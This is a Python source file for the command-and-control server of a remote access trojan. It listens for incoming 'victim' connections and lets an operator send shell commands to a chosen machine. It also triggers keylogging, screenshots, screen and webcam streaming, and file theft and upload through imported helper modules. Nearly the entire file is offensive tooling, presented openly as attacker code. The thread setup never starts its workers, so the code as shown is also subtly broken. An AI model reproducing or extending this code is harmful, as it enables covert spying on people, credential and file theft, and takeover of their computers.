

import socket 
import sys  
import threading 
import time
from queue import Queue 
import subprocess
import cv2, struct, pickle
import os
import pyautogui
import platform
from vidstream import StreamingServer
from utils.fileUtils import *
from utils.logUtils import *
from utils.screenUtils import *
from utils.webcamUtils import *



NUMBER_OF_THREADS=2
JOB_NUMBER=[1,2]  

queue=Queue() 

all_connections = [] 
all_address = []


# function to create a socket
def create_socket():
    try:
        global host  
        global port 
        global s    
        host='192.168.1.5'      # initialize with static ip of server
        port=9999    
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
    except socket.error as e:        # Error handling
        print("Socket creation error: "+str(e))    # prints error message 

# function to bind socket to server(attacker) and listen to incoming connections from victim

def bind_socket():
    try:
        global host
        global port
        global s
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) 
        print("Binding to port: {}".format(port)) # Attemp to bind socket to host and port

        s.bind((host,port))   # binds socket object s to host/ip of server and port number specified in port variable
                              
        s.listen(5) 

    except socket.error as e:                    # Error handling
        print("Socket binding error:- "+str(e)+"\n"+"Retrying...")  # prints socket binding error
        bind_socket()                           
    

def accept_connections():

    for c in all_connections:        # closing all previous connections when file is restarted
        c.close() 

    del all_connections[:]    # clearing previous information in both lists
    del all_address[:]

    global s
    
    while True:
        try:
            conn,address=s.accept()  # accpeting a new connection

            s.setblocking(1)  
                             
            all_connections.append(conn)  # saving conn and address into the list
            all_address.append(address)

            print("Connection has been established!! with victim IP: " + address[0] +" and port: " + str(address[1])) # it prints IP and port of victim to which connection has been established

        except:
            print("Error accepting the connection!!")



def start_CMD():
    while True:
        cmd=input('CMD> ')

        # list command -> it will be used to list all connected clients on prompt

        if cmd == "list" : 
            list_connections()   # funtion to list all the connected clients 
                                 
        # select command -> it will be used to select a connected client by using client id
        
        elif cmd.split(' ')[0]== "select":
            cl=get_target(cmd)    
            if cl: 
                send_target_commands(cl[0],cl[1]) # function to send commands to the target/selected victim

        elif cmd == "exit":       # to exit from server program
            for conn in all_connections:
                try:
                    conn.send('exit'.encode())
                except:
                    pass
                
            break

        elif cmd == "help":    # to print info about all valid commands
            print("1. list - command lists all active clients connected to server")
            print("2. select - command to select the target client (mandatory arguement - client id of target machine)")
            print("3. exit - command to exit from shell\n")

        else:
            print("'"+cmd+"' " + "Command not recognized!!")

# Display all active connections with clients
def list_connections():
    output=""

    for i,conn in enumerate(all_connections):
        try:                                    
            conn.send(str.encode(" "))          
            conn.recv(20480)                  
        except:
            del all_connections[i]             
            del all_address[i]                
            continue

        output+=str(i) + "            " + str(all_address[i][0]) + "    " + str(all_address[i][1]) + "\n"  # adding information of active client to output

    print("-------ACTIVE CLIENTS--------" + "\n" + "CLIENT ID    IP                PORT" + "\n" + output)    # printing the list of active clients


# Selecting an client out of list of active clients using select command
def get_target(cmd): 
    try:
        client_id=cmd.split(" ")[1]   # retrieving client id of target
        client_id=int(client_id)
        conn=all_connections[client_id]   # getiing connection object of target machine
        print("You are now connected to " + str(all_address[client_id][0]))
        print(str(all_address[client_id][0]) + "> ",end="")   
        return conn,all_address[client_id][0]+'-'+str(all_address[client_id][1])     # return connection object of target

    except:                                  # if client id mentioned is not present then error is reported
        print("Selected client id not valid")
        return None


# Function for sending commands to target machine
def send_target_commands(conn,ip):
    try:
        os.mkdir(os.path.join(os.getcwd(),ip))
    except Exception as e:
        pass
        #print(e)
    while True:  # An infinite loop is written so that we are able to send multiple commands before closing connection
        try:
            
            cmd=input() # Take input command from user in variable cmd

            if cmd=="quit": # if input command is quit , then we close the connection,socket and terminal
                break


            if len(str.encode(cmd)) > 0: # str.encode() it converts string from unicode format to utf-8 format(byte format)
                conn.sendall(str.encode(cmd)) 

                client_response=str(conn.recv(20480),"utf-8")   # now we need to accept data from client which will contain output of our command executed on client's terminal
                                                               
            
            if client_response == "Logging_keys":
                keyLogger(conn,ip)
                continue         


            if client_response == "capturing":
                screenCapture(conn,ip)
                continue

            if client_response == "streaming":
                try:
                    screenstream()
                    continue
                except KeyboardInterrupt:
                    continue

            if client_response == "camstreaming":
                try:
                    camstream(conn, ip)
                    continue
                except KeyboardInterrupt:
                    continue        

            if client_response == "clicking":
                print("con ip " , conn,ip)
                screenshot(conn,ip)
                continue

            if client_response == "capturing_webcam" :
                #print("Function call debug")
                webcamCapture(conn,ip)
                continue

            if client_response == "sending_file":
                getfile(conn,cmd,ip)
                continue

            if client_response == "receiving_file":
                sendfile(conn,cmd)
                continue


            print(client_response,end="") #print client response and end="" is used so that next command begins from new line in terminal
        except Exception as e:
            print("Error sending commands!!",e)



def create_workers():
    for _ in range(NUMBER_OF_THREADS):  
        t=threading.Thread(target=work)  
        t.daemon=True      



def create_jobs():
    try:
        for x in JOB_NUMBER:
            queue.put(x)           # enqueue job into the queue
        queue.join()               # blocks untill all jobs in queue have been processed and task_done() is recieved for all
    except KeyboardInterrupt:
        print("\nClosing the Sever!! ")
        exit()


def work():
    while True:
        x=queue.get()          
        if x == 1:             
            #print("first")
            create_socket()    
            bind_socket()       
            accept_connections()
        if x == 2:                  
            #print("second")
            start_CMD()      
            queue.task_done()
        queue.task_done()

def main():
    create_workers()
    create_jobs()

if __name__ == "__main__":
    main()